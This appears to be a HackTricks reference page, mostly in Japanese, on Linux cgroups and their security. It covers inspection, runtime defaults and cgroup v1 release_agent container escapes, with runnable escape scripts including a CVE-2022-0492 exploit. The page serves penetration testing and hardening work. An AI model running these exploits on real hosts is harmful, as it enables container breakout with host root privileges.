# cgroups

{{#include ../../../../banners/hacktricks-training.md}}

## Overview

Linux **control groups** は、プロセスを会計、制限、優先度付け、ポリシー適用のためにまとめるためのカーネルの仕組みです。namespaces が主にリソースの見え方を分離することに関するなら、cgroups は主に一群のプロセスがそのリソースをどれだけ消費できるか（**どれだけ**）や、場合によってはどのクラスのリソースとやり取りできるか（**どのクラスのリソース**）を管理します。Containers は常に cgroups に依存します。ユーザが直接それらを見ない場合でも、ほとんどすべてのモダンな runtime はカーネルに「これらのプロセスはこのワークロードに属しており、これが適用されるリソースのルールです」と伝える手段を必要とするからです。

このため、container engines は新しい container をそれ自身の cgroup サブツリーに配置します。process tree がそこに置かれると、runtime は memory を上限設定したり、PIDs の数を制限したり、CPU 使用量に重み付けしたり、I/O を制御したり、デバイスアクセスを制限したりできます。本番環境では、これはマルチテナントの安全性と運用上の基本的衛生の両方に不可欠です。意味のあるリソース制御がない container は、memory を枯渇させたり、プロセスでシステムを氾濫させたり、CPU や I/O を独占してホストや隣接する workloads を不安定にする可能性があります。

セキュリティの観点から、cgroups は2つの点で重要です。第一に、リソース制限が不適切または欠如していると、単純なサービス拒否攻撃が可能になります。第二に、いくつかの cgroup 機能は、特に古い **cgroup v1** のセットアップで、コンテナ内部から書き込み可能だった場合に強力なブレイクアウト用プリミティブを生み出すことが歴史的にありました。

## v1 Vs v2

実際には主に 2 つの cgroup モデルがあります。**cgroup v1** は複数のコントローラ階層を露出しており、古い exploit の解説はしばしばそこで利用可能な奇妙で時には過度に強力なセマンティクスを中心に展開します。**cgroup v2** はより統一された階層と一般によりクリーンな挙動を導入します。現代のディストリビューションは cgroup v2 をますます好みますが、混在またはレガシーな環境は依然存在するため、両モデルは実際のシステムをレビューする際に依然として関連性があります。

この違いが重要なのは、cgroup v1 における **`release_agent`** の悪用のような有名な container ブレイクアウト事例のいくつかが、非常に具体的に古い cgroup の挙動に結びついているからです。ブログで cgroup の exploit を見て、それを盲目的に最新の cgroup v2 のみのシステムに適用すると、ターゲットで実際に可能なことを誤解する可能性が高いです。

## Inspection

現在のシェルがどの cgroup に属しているかを素早く確認する方法は次のとおりです:
```bash
cat /proc/self/cgroup
findmnt -T /sys/fs/cgroup
```
`/proc/self/cgroup` ファイルは、現在のプロセスに関連付けられた cgroup パスを示します。モダンな cgroup v2 ホストでは、しばしば統一されたエントリが表示されます。古いまたはハイブリッドなホストでは、複数の v1 コントローラのパスが表示されることがあります。パスが分かったら、対応するファイルを `/sys/fs/cgroup` 以下で確認して、制限や現在の使用状況を調べられます。

cgroup v2 ホストでは、次のコマンドが役立ちます:
```bash
ls -l /sys/fs/cgroup
cat /sys/fs/cgroup/cgroup.controllers
cat /sys/fs/cgroup/cgroup.subtree_control
```
これらのファイルは、どのコントローラが存在し、どのコントローラが子 cgroups に委譲されているかを示します。この委譲モデルは、rootless や systemd-managed 環境で重要です。そうした環境では、ランタイムが親階層が実際に委譲する cgroup 機能のサブセットしか制御できないことがあります。

## Lab

実際に cgroups を観察する一つの方法は、メモリ制限付きコンテナを実行することです:
```bash
docker run --rm -it --memory=256m debian:stable-slim bash
cat /proc/self/cgroup
cat /sys/fs/cgroup/memory.max 2>/dev/null || cat /sys/fs/cgroup/memory.limit_in_bytes 2>/dev/null
```
PID-limited container を試してみることもできます：
```bash
docker run --rm -it --pids-limit=64 debian:stable-slim bash
cat /sys/fs/cgroup/pids.max 2>/dev/null
```
These examples are useful because they help connect the runtime flag to the kernel file interface. The runtime is not enforcing the rule by magic; it is writing the relevant cgroup settings and then letting the kernel enforce them against the process tree.

## ランタイムの使用

Docker, Podman, containerd, and CRI-O all rely on cgroups as part of normal operation. 違いは通常、cgroups を使うかどうかではなく、**どのデフォルトを選ぶか**、**systemd とどのように連携するか**、**rootless delegation がどのように動作するか**、および **設定のどれだけがエンジンレベルで制御され、どれだけがオーケストレーションレベルで制御されるか** に関するものです。

In Kubernetes, resource requests and limits eventually become cgroup configuration on the node. Pod YAML からカーネルによる強制までの経路は kubelet、CRI runtime、そして OCI runtime を経由しますが、最終的にルールを適用するのは cgroups というカーネルの仕組みです。Incus/LXC 環境でも cgroups は多用されます。特に system containers はより豊富なプロセスツリーや VM に近い運用期待を露出することが多いためです。

## 誤設定と脱出

古典的な cgroup セキュリティの話は、書き込み可能な **cgroup v1 `release_agent`** メカニズムです。そのモデルでは、攻撃者が適切な cgroup ファイルに書き込み、`notify_on_release` を有効にし、`release_agent` に格納されたパスを制御できれば、cgroup が空になったときにカーネルがホストの初期名前空間で攻撃者の選んだパスを実行してしまう可能性があります。だからこそ、古い解析では cgroup コントローラの書き込み可能性、マウントオプション、名前空間／ケーパビリティ条件に大きな注意が払われています。

`release_agent` が利用できない場合でも、cgroup の誤設定は依然として重要です。過度に広いデバイスアクセスはコンテナからホストデバイスへの到達を可能にします。メモリや PID の制限が欠如していると、単純なコード実行がホスト DoS に転じることがあります。rootless シナリオでの弱い cgroup デリゲーションは、ランタイムが実際には適用できていなかった制限が存在すると守備側を誤解させることもあります。

### `release_agent` の背景

`release_agent` テクニックは **cgroup v1** のみに適用されます。基本的な考え方は、ある cgroup 内の最後のプロセスが終了し `notify_on_release=1` が設定されていると、カーネルが `release_agent` に格納されたパスのプログラムを実行する、というものです。その実行は **ホスト上の初期名前空間** で行われるため、書き込み可能な `release_agent` がコンテナ脱出の原始的手段になり得ます。

このテクニックを成功させるために、攻撃者は通常以下を必要とします:

- 書き込み可能な **cgroup v1** 階層
- 子 cgroup を作成または利用する能力
- `notify_on_release` を設定する能力
- `release_agent` にパスを書き込む能力
- ホスト側から見て実行ファイルに解決されるパス

### 古典的 PoC

The historical one-liner PoC is:
```bash
d=$(dirname $(ls -x /s*/fs/c*/*/r* | head -n1))
mkdir -p "$d/w"
echo 1 > "$d/w/notify_on_release"
t=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
touch /o
echo "$t/c" > "$d/release_agent"
cat <<'EOF' > /c
#!/bin/sh
ps aux > "$t/o"
EOF
chmod +x /c
sh -c "echo 0 > $d/w/cgroup.procs"
sleep 1
cat /o
```
This PoC writes a payload path into `release_agent`, triggers cgroup release, and then reads back the output file generated on the host.

### 読みやすい手順解説

同じ考え方をステップに分けると理解しやすくなります。

1. 書き込み可能な cgroup を作成して準備する:
```bash
mkdir /tmp/cgrp
mount -t cgroup -o rdma cgroup /tmp/cgrp    # or memory if available in v1
mkdir /tmp/cgrp/x
echo 1 > /tmp/cgrp/x/notify_on_release
```
2. コンテナのファイルシステムに対応するホスト上のパスを特定する:
```bash
host_path=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
echo "$host_path/cmd" > /tmp/cgrp/release_agent
```
3. ホストのパスから見える payload を配置する:
```bash
cat <<'EOF' > /cmd
#!/bin/sh
ps aux > /output
EOF
chmod +x /cmd
```
4. cgroup を空にして実行をトリガーする:
```bash
sh -c "echo $$ > /tmp/cgrp/x/cgroup.procs"
sleep 1
cat /output
```
The effect is host-side execution of the payload with host root privileges. In a real exploit, the payload usually writes a proof file, spawns a reverse shell, or modifies host state.

### `/proc/<pid>/root` を使った相対パス変種

一部の環境では、ホスト側から見た container filesystem へのパスが明確でない、あるいは storage driver によって隠されていることがあります。その場合、payload のパスは `/proc/<pid>/root/...` を介して表現できます。ここで `<pid>` は現在の container 内のプロセスに対応するホストの PID です。これが relative-path brute-force 変種の基礎になります:
```bash
#!/bin/sh

OUTPUT_DIR="/"
MAX_PID=65535
CGROUP_NAME="xyx"
CGROUP_MOUNT="/tmp/cgrp"
PAYLOAD_NAME="${CGROUP_NAME}_payload.sh"
PAYLOAD_PATH="${OUTPUT_DIR}/${PAYLOAD_NAME}"
OUTPUT_NAME="${CGROUP_NAME}_payload.out"
OUTPUT_PATH="${OUTPUT_DIR}/${OUTPUT_NAME}"

sleep 10000 &

cat > ${PAYLOAD_PATH} << __EOF__
#!/bin/sh
OUTPATH=\$(dirname \$0)/${OUTPUT_NAME}
ps -eaf > \${OUTPATH} 2>&1
__EOF__

chmod a+x ${PAYLOAD_PATH}

mkdir ${CGROUP_MOUNT}
mount -t cgroup -o memory cgroup ${CGROUP_MOUNT}
mkdir ${CGROUP_MOUNT}/${CGROUP_NAME}
echo 1 > ${CGROUP_MOUNT}/${CGROUP_NAME}/notify_on_release

TPID=1
while [ ! -f ${OUTPUT_PATH} ]
do
if [ $((${TPID} % 100)) -eq 0 ]
then
echo "Checking pid ${TPID}"
if [ ${TPID} -gt ${MAX_PID} ]
then
echo "Exiting at ${MAX_PID}"
exit 1
fi
fi
echo "/proc/${TPID}/root${PAYLOAD_PATH}" > ${CGROUP_MOUNT}/release_agent
sh -c "echo \$\$ > ${CGROUP_MOUNT}/${CGROUP_NAME}/cgroup.procs"
TPID=$((${TPID} + 1))
done

sleep 1
cat ${OUTPUT_PATH}
```
ここで重要なのはブルートフォース自体ではなくパスの形式です: `/proc/<pid>/root/...` により、カーネルは直接のホストストレージパスが事前に分からなくても、ホスト名前空間からコンテナのファイルシステム内のファイルを解決できます。

### CVE-2022-0492 バリアント

2022年に、CVE-2022-0492 は cgroup v1 における `release_agent` への書き込みがユーザー名前空間の**初期**で `CAP_SYS_ADMIN` のチェックを正しく行っていないことを示しました。これにより、cgroup 階層をマウントできるコンテナプロセスは、ホストのユーザー名前空間で既に特権を持っていなくても `release_agent` に書き込めるようになり、脆弱なカーネル上でこの手法がはるかに到達可能になりました。

Minimal exploit:
```bash
apk add --no-cache util-linux
unshare -UrCm sh -c '
mkdir /tmp/c
mount -t cgroup -o memory none /tmp/c
echo 1 > /tmp/c/notify_on_release
echo /proc/self/exe > /tmp/c/release_agent
(sleep 1; echo 0 > /tmp/c/cgroup.procs) &
while true; do sleep 1; done
'
```
脆弱なカーネルでは、ホストは `/proc/self/exe` をホストの root 権限で実行します。

実際に悪用する場合は、環境がまだ書き込み可能な cgroup-v1 パスや危険なデバイスアクセスを露出していないかをまず確認してください：
```bash
mount | grep cgroup
find /sys/fs/cgroup -maxdepth 3 -name release_agent 2>/dev/null -exec ls -l {} \;
find /sys/fs/cgroup -maxdepth 3 -writable 2>/dev/null | head -n 50
ls -l /dev | head -n 50
```
もし`release_agent`が存在し、書き込み可能であれば、あなたはすでに legacy-breakout の領域にいます:
```bash
find /sys/fs/cgroup -maxdepth 3 -name notify_on_release 2>/dev/null
find /sys/fs/cgroup -maxdepth 3 -name cgroup.procs 2>/dev/null | head
```
cgroup path 自体で escape が得られない場合、次に実用的に使われるのはしばしば denial of service や reconnaissance です:
```bash
cat /sys/fs/cgroup/pids.max 2>/dev/null
cat /sys/fs/cgroup/memory.max 2>/dev/null
cat /sys/fs/cgroup/cpu.max 2>/dev/null
```
これらのコマンドは、ワークロードが fork-bomb を仕掛ける余地があるか、メモリを過度に消費できるか、または書き込み可能な旧式の cgroup インターフェイスを悪用できるかを素早く教えてくれます。

## Checks

ターゲットをレビューする際、cgroup チェックの目的は、どの cgroup model が使われているか、コンテナが書き込み可能な controller paths を見ているか、そして古い breakout primitives（例えば `release_agent`）がそもそも関連性があるかを把握することです。
```bash
cat /proc/self/cgroup                                      # Current process cgroup placement
mount | grep cgroup                                        # cgroup v1/v2 mounts and mount options
find /sys/fs/cgroup -maxdepth 3 -name release_agent 2>/dev/null   # Legacy v1 breakout primitive
cat /proc/1/cgroup                                         # Compare with PID 1 / host-side process layout
```
ここで注目すべき点：

- `mount | grep cgroup` が **cgroup v1** を示す場合、古い breakout writeups がより関連性を持ちます。
- `release_agent` が存在し、アクセス可能であれば、直ちに詳細な調査に値します。
- 見えている cgroup 階層が書き込み可能で、かつコンテナが強い capabilities を持っている場合、その環境はさらに精査に値します。

もし **cgroup v1**、書き込み可能な controller マウント、そしてコンテナが強い capabilities を持つか seccomp/AppArmor 保護が弱い、という組み合わせを発見したら、注意深い注目が必要です。cgroups はしばしば退屈なリソース管理の話題として扱われますが、歴史的に見て「リソース制御」と「ホストへの影響」の境界が常に想定どおりに明確でなかったため、最も示唆に富む container escape chains の一部になってきました。

## ランタイムのデフォルト

| Runtime / platform | デフォルトの状態 | デフォルトの動作 | よくある手動での弱体化 |
| --- | --- | --- | --- |
| Docker Engine | デフォルトで有効 | コンテナは自動的に cgroups に配置されます。リソース制限はフラグで指定しない限りオプションです | `--memory`、`--pids-limit`、`--cpus`、`--blkio-weight` を省略すること；`--device`；`--privileged` |
| Podman | デフォルトで有効 | `--cgroups=enabled` がデフォルトです。cgroup namespace のデフォルトは cgroup のバージョンによって異なります（cgroup v2 では `private`、一部の cgroup v1 セットアップでは `host`） | `--cgroups=disabled`、`--cgroupns=host`、デバイスアクセスの緩和、`--privileged` |
| Kubernetes | ランタイム経由でデフォルトで有効 | Pods とコンテナはノードランタイムによって cgroups に配置されます。細かなリソース制御は `resources.requests` / `resources.limits` に依存します | resource requests/limits を省略すること、特権付きデバイスアクセス、ホストレベルのランタイムの誤設定 |
| containerd / CRI-O | デフォルトで有効 | cgroups は通常のライフサイクル管理の一部です | デバイス制御を緩めるランタイム設定や、レガシーで書き込み可能な cgroup v1 インターフェースを公開する設定 |

重要な区別は、**cgroup の存在** は通常デフォルトである一方、**有用なリソース制約** は明示的に設定されない限り多くの場合オプションである、という点です。
{{#include ../../../../banners/hacktricks-training.md}}
